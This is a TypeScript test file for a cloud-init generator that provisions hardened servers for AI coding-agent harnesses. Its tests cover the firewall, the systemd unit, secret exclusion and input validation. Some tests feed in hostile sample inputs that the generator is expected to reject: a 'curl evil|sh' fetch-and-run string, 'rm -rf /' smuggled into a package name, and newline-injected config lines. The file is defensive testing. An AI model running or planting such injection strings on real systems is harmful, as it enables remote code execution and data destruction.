import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { renderCloudInit, resolveHarnessPackages, SECRET_PATTERNS } from '../src/index.ts';
import { OWNER_NPUB, PROVISIONING_PUBKEY } from './helpers.ts';

const base = {
  agent: 'reviewer',
  harnesses: ['claude', 'codex'],
  beamhopVersion: '1.2.3',
  ownerNpub: OWNER_NPUB,
  daemonNsecRef: 'agent.reviewer.nsec',
  provisioningPubkey: PROVISIONING_PUBKEY,
  provider: 'hetzner',
};

// biome-ignore lint/suspicious/noExplicitAny: parsed YAML
const doc = (s: string): any => parse(s);
// biome-ignore lint/suspicious/noExplicitAny: parsed YAML
const file = (d: any, path: string): string =>
  d.write_files.find((f: { path: string }) => f.path === path).content;

describe('renderCloudInit', () => {
  it('matches snapshot', () => {
    expect(renderCloudInit(base)).toMatchSnapshot();
  });

  it('is valid #cloud-config YAML with the beamhop user and srt prerequisites', () => {
    const out = renderCloudInit(base);
    expect(out.startsWith('#cloud-config\n')).toBe(true);
    const d = doc(out);
    expect(d.users[0]).toMatchObject({ name: 'beamhop', lock_passwd: true });
    expect(d.users[0].ssh_authorized_keys).toBeUndefined();
    expect(d.disable_root).toBe(true);
    expect(d.ssh_pwauth).toBe(false);
    for (const p of ['bubblewrap', 'socat', 'ripgrep', 'ufw', 'git']) expect(d.packages).toContain(p);
  });

  it('installs Node 22+ from the verified official tarball and pins beamhop + harness packages', () => {
    const d = doc(renderCloudInit(base));
    const script = file(d, '/usr/local/sbin/beamhop-install-node');
    expect(script).toContain('https://nodejs.org/dist/$DIST/SHASUMS256.txt');
    expect(script).toContain('sha256sum -c -');
    expect(d.runcmd[0]).toEqual(['/usr/local/sbin/beamhop-install-node', 'latest-v22.x']);
    const npm = d.runcmd.find((c: string[]) => c[0] === 'npm');
    expect(npm).toEqual([
      'npm',
      'install',
      '--global',
      '--no-fund',
      '--no-audit',
      'beamhop@1.2.3',
      '@anthropic-ai/claude-code',
      '@openai/codex',
    ]);
  });

  it('writes a hardened systemd unit', () => {
    const unit = file(doc(renderCloudInit(base)), '/etc/systemd/system/beamhopd.service');
    for (const line of [
      'User=beamhop',
      'Restart=always',
      'NoNewPrivileges=yes',
      'ProtectSystem=strict',
      'ReadWritePaths=/home/beamhop/.beamhop',
      'WantedBy=multi-user.target',
    ]) {
      expect(unit).toContain(line);
    }
    // bubblewrap needs user namespaces
    expect(unit).not.toMatch(/^RestrictNamespaces=/m);
  });

  it('firewall: default deny incoming, allow outgoing, no SSH by default', () => {
    const d = doc(renderCloudInit(base));
    const cmds = d.runcmd.map((c: string[]) => c.join(' '));
    expect(cmds).toContain('ufw default deny incoming');
    expect(cmds).toContain('ufw default allow outgoing');
    expect(cmds).toContain('ufw --force enable');
    expect(cmds.some((c: string) => /ufw (allow|limit)/.test(c))).toBe(false);
    expect(cmds.some((c: string) => c.includes('systemctl disable --now ssh.socket ssh.service'))).toBe(true);
    // ufw is enabled before the daemon starts
    expect(cmds.indexOf('ufw --force enable')).toBeLessThan(
      cmds.indexOf('systemctl enable --now beamhopd.service'),
    );
  });

  it('SSH opt-in adds authorized keys and a rate-limited ssh rule', () => {
    const key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ1aWxkZXJrZXlmb3J0ZXN0c29ubHkxMjM0NTY3OA me@laptop';
    const d = doc(renderCloudInit({ ...base, sshAuthorizedKeys: [key] }));
    expect(d.users[0].ssh_authorized_keys).toEqual([key]);
    const cmds = d.runcmd.map((c: string[]) => c.join(' '));
    expect(cmds).toContain('ufw limit OpenSSH');
    expect(cmds.some((c: string) => c.includes('disable --now ssh'))).toBe(false);
  });

  it('embeds only the owner npub, provisioning pubkey and nsec reference — no secrets', () => {
    const out = renderCloudInit(base);
    const env = file(doc(out), '/etc/beamhop/beamhopd.env');
    expect(env).toContain(`BEAMHOP_OWNER_NPUB=${OWNER_NPUB}`);
    expect(env).toContain(`BEAMHOP_PROVISIONING_PUBKEY=${PROVISIONING_PUBKEY}`);
    expect(env).toContain('BEAMHOP_DAEMON_NSEC_REF=agent.reviewer.nsec');
    expect(env).toContain('BEAMHOP_AWAIT_PROVISIONING=1');
    for (const p of SECRET_PATTERNS) expect(out).not.toMatch(p);
    expect(out).not.toMatch(/nsec1/);
    expect(out).not.toMatch(/(api[_-]?key|password|token)\s*[=:]/i);
  });

  it('PROV-1: carries the one-time binding token in a root-only env file; refuses malformed tokens', () => {
    const token = 'ab'.repeat(32);
    const d = doc(renderCloudInit({ ...base, provisioningToken: token }));
    expect(file(d, '/etc/beamhop/beamhopd.env')).toContain(`BEAMHOP_PROVISIONING_TOKEN=${token}`);
    const entry = d.write_files.find((f: { path: string }) => f.path === '/etc/beamhop/beamhopd.env');
    expect(entry.permissions).toBe('0600');
    expect(() => renderCloudInit({ ...base, provisioningToken: 'short' })).toThrow(/provisioningToken/);
    expect(() =>
      renderCloudInit({ ...base, provisioningToken: `${'a'.repeat(50)}\nBEAMHOP_AWAIT_PROVISIONING=0` }),
    ).toThrow(/provisioningToken/);
  });

  it('refuses secret values and injection attempts', () => {
    const nsec = `nsec1${'qpzry9x8gf2tvdw0s3jn54khce6mua7l'.repeat(2).slice(0, 58)}`;
    expect(() => renderCloudInit({ ...base, daemonNsecRef: nsec })).toThrow(/reference/);
    expect(() => renderCloudInit({ ...base, ownerNpub: nsec })).toThrow(/npub/);
    expect(() => renderCloudInit({ ...base, provisioningPubkey: nsec })).toThrow(/pubkey/);
    expect(() => renderCloudInit({ ...base, beamhopVersion: 'latest' })).toThrow(/semver/);
    expect(() => renderCloudInit({ ...base, beamhopVersion: '1.2.3; curl evil|sh' })).toThrow();
    expect(() => renderCloudInit({ ...base, agent: 'Bad Name' })).toThrow(/agent name/);
    expect(() =>
      renderCloudInit({ ...base, harnesses: ['x'], harnessPackages: { x: ['foo; rm -rf /'] } }),
    ).toThrow(/npm package/);
    expect(() => renderCloudInit({ ...base, harnesses: ['unknown-harness'] })).toThrow(/unknown harness/);
    expect(() => renderCloudInit({ ...base, sshAuthorizedKeys: ['not a key\nruncmd: [evil]'] })).toThrow(
      /OpenSSH/,
    );
    expect(() => renderCloudInit({ ...base, nodeDist: 'latest-v18.x' })).toThrow(/nodeDist/);
  });

  it('stays below the Hetzner 32 KiB user_data limit', () => {
    expect(Buffer.byteLength(renderCloudInit(base))).toBeLessThan(32 * 1024);
  });
});

describe('resolveHarnessPackages', () => {
  it('maps, dedupes and honours overrides', () => {
    expect(resolveHarnessPackages(['claude', 'claude-code', 'pi'])).toEqual([
      '@anthropic-ai/claude-code',
      '@mariozechner/pi-coding-agent',
    ]);
    expect(resolveHarnessPackages(['claude'], { claude: ['@anthropic-ai/claude-code@2.0.1'] })).toEqual([
      '@anthropic-ai/claude-code@2.0.1',
    ]);
  });
});
